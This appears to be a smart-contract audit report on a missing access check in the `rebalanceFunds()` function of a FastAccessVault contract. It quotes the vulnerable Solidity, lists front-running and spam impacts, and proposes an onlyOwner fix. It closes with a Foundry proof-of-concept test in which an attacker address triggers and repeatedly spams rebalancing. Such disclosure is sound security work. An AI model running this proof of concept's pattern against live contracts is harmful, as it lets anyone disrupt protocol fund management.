  "body": "## Finding description and impact\n\nThe `rebalanceFunds()` function in `FastAccessVault` lacks access control, allowing any address to trigger vault\n rebalancing operations. This enables attackers to front-run legitimate rebalancing calls, manipulate fund \n transfers to the custodian, and spam the function to grief the system by flooding event logs and wasting gas.\n  The function performs critical state changes including token transfers and event emissions that trigger \n  off-chain custodian actions, making unrestricted access a significant security risk.\n\n\nThe `FastAccessVault` contract maintains a liquidity buffer for instant iTRY redemptions. The `rebalanceFunds()` \nfunction is responsible for maintaining optimal buffer levels by either requesting top-ups from the custodian \n(when underfunded) or transferring excess funds back to the custodian (when overfunded).\n\n\n\nUnlike other critical functions in the contract that use access control modifiers\n (`onlyOwner` for configuration functions, `onlyIssuer` for `processTransfer()`), the `rebalanceFunds()`\n  function has no access restrictions:\n\n```solidity\nfunction rebalanceFunds() external {  // No modifier!\n    uint256 aumReferenceValue = _issuerContract.getCollateralUnderCustody();\n    uint256 targetBalance = _calculateTargetBufferBalance(aumReferenceValue);\n    uint256 currentBalance = _vaultToken.balanceOf(address(this));\n\n    if (currentBalance < targetBalance) {\n        uint256 needed = targetBalance - currentBalance;\n        emit TopUpRequestedFromCustodian(address(custodian), needed, targetBalance);\n    } else if (currentBalance > targetBalance) {\n        uint256 excess = currentBalance - targetBalance;\n        if (!_vaultToken.transfer(custodian, excess)) {\n            revert CommonErrors.TransferFailed();\n        }\n        emit ExcessFundsTransferredToCustodian(address(custodian), excess, targetBalance);\n    }\n}\n```\n\n**Why This Matters:**\n\n1. **State-Changing Operations**: The function performs actual token transfers (line 176) when the vault is overfunded, moving funds to the custodian address.\n\n2. **Event-Driven Architecture**: The function emits events that trigger off-chain custodian actions. The `TopUpRequestedFromCustodian` event signals the custodian to deposit funds, while `ExcessFundsTransferredToCustodian` confirms transfers.\n\n3. **Dynamic State Dependencies**: The function reads live on-chain state (`getCollateralUnderCustody()`) that can change between calls, making timing critical.\n\n4. **No Rate Limiting**: There are no mechanisms to prevent repeated calls, allowing unlimited spam.\n\n## Impact\n\nAttackers can front-run legitimate rebalancing operations to control when excess DLF tokens are transferred \nto the custodian, disrupting the FastAccessVault's buffer management and causing the custodian's off-chain event \nmonitoring system to miss legitimate rebalancing signals,\n while unlimited spam calls flood `TopUpRequestedFromCustodian` and `ExcessFundsTransferredToCustodian` events, \n creating a denial-of-service vector against the custodian's infrastructure.\n\n## Recommended mitigation steps\n\n\nAdd access control to restrict `rebalanceFunds()` to authorized parties. Two recommended approaches:\n\n Owner-Only Access\n\n```solidity\nfunction rebalanceFunds() external onlyOwner {\n    // ... existing code ...\n}\n```",
  "proof_of_concept": "forge test --match-test test_rebalanceFunds_noAccessControl_allowsFrontRunningAndGriefing -vvvv\n\n\n\n\n```javascript\n\n\n\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport {Test} from \"forge-std/Test.sol\";\nimport {FastAccessVault} from \"../src/protocol/FastAccessVault.sol\";\nimport {MockERC20} from \"./mocks/MockERC20.sol\";\nimport {MockIssuerContract} from \"./mocks/MockIssuerContract.sol\";\n\ncontract FastAccessVaultRebalanceFundsNoAccessControlPOC is Test {\n    FastAccessVault public vault;\n    MockERC20 public vaultToken;\n    MockIssuerContract public issuerContract;\n    address public owner;\n    address public custodian;\n    address public attacker;\n    address public legitimateKeeper;\n\n    uint256 constant INITIAL_AUM = 10_000_000e18;\n    uint256 constant TARGET_BPS = 500;\n    uint256 constant MINIMUM = 50_000e18;\n\n    function setUp() public {\n        owner = makeAddr(\"owner\");\n        custodian = makeAddr(\"custodian\");\n        attacker = makeAddr(\"attacker\");\n        legitimateKeeper = makeAddr(\"keeper\");\n\n        vaultToken = new MockERC20(\"DLF\", \"DLF\");\n        issuerContract = new MockIssuerContract(INITIAL_AUM);\n\n        vault = new FastAccessVault(\n            address(vaultToken),\n            address(issuerContract),\n            custodian,\n            TARGET_BPS,\n            MINIMUM,\n            owner\n        );\n\n        issuerContract.setVault(address(vault));\n        vaultToken.mint(custodian, 10_000_000e18);\n    }\n\n    function test_rebalanceFunds_noAccessControl_allowsFrontRunningAndGriefing() public {\n        uint256 targetBalance = (INITIAL_AUM * TARGET_BPS) / 10000;\n        uint256 overfundedAmount = targetBalance + 1_000_000e18;\n        vaultToken.mint(address(vault), overfundedAmount);\n\n        uint256 custodianBalanceBefore = vaultToken.balanceOf(custodian);\n\n        vm.startPrank(attacker);\n        vault.rebalanceFunds();\n        vm.stopPrank();\n\n        uint256 vaultBalanceAfterFirst = vault.getAvailableBalance();\n        uint256 custodianBalanceAfterFirst = vaultToken.balanceOf(custodian);\n\n        assertEq(vaultBalanceAfterFirst, targetBalance, \"Attacker can rebalance vault\");\n        assertGt(custodianBalanceAfterFirst, custodianBalanceBefore, \"Attacker triggered fund transfer\");\n\n        vm.startPrank(attacker);\n        for (uint256 i = 0; i < 10; i++) {\n            vault.rebalanceFunds();\n        }\n        vm.stopPrank();\n\n        assertEq(vault.getAvailableBalance(), targetBalance, \"Attacker can spam calls without restriction\");\n\n        vm.startPrank(legitimateKeeper);\n        vault.rebalanceFunds();\n        vm.stopPrank();\n\n        assertEq(vault.getAvailableBalance(), targetBalance, \"Legitimate call sees already-balanced vault\");\n        assertEq(vaultToken.balanceOf(custodian), custodianBalanceAfterFirst, \"No additional transfer from legitimate call\");\n    }\n}\n\n\n\n```",
